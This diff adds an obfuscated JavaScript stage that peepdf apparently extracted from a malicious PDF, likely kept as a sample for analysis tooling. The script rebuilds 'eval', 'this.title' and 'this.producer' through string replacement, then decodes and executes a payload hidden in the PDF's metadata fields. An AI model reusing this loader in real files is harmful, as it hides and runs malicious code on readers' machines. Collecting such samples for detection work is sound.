@@ -1,0 +1,30 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [(test) <</S /JavaScript
+/JS (
+Lybpabq='';
+TegEqidisokecu=2011;
+var j = TegEqidisokecu-2007;
+VjAjabeqagosy='2011s'.replace(TegEqidisokecu,'hi');
+Zytogylidobup=('.tit2011').replace(TegEqidisokecu,'le');
+eval('WwzanahaTasebozot=t'+VjAjabeqagosy+Zytogylidobup);
+Rexysletbuvpylo=('sub2011').replace(TegEqidisokecu,'ject');
+eval('HafOdu=t'+VjAjabeqagosy+'.'+Rexysletbuvpylo);
+HafOdu=HafOdu.replace(TegEqidisokecu,'al');
+eval('LegakavAeg=t'+VjAjabeqagosy);
+eval('HixeXuqitasgeq=LegakavAeg[HafOdu]');
+TykazaDjiriqahy='.pro2011cer';
+TykazaDjiriqahy=HixeXuqitasgeq('TykazaDjiriqahy.replace(TegEqidisokecu,"du")');
+eval('KesooseputezociQal=t'+VjAjabeqagosy+TykazaDjiriqahy);
+SaqarukimivybeTuz=HixeXuqitasgeq(KesooseputezociQal);
+NukidOsymamiwodojo = WwzanahaTasebozot.split(',');
+for (HysOm = 0; HysOm < NukidOsymamiwodojo.length; HysOm++) {
+	KozVideb = HixeXuqitasgeq(NukidOsymamiwodojo[HysOm]);
+	Lybpabq += SaqarukimivybeTuz(KozVideb);
+}
+HixeXuqitasgeq(Lybpabq);
+
+)
+>>]
+>>
+
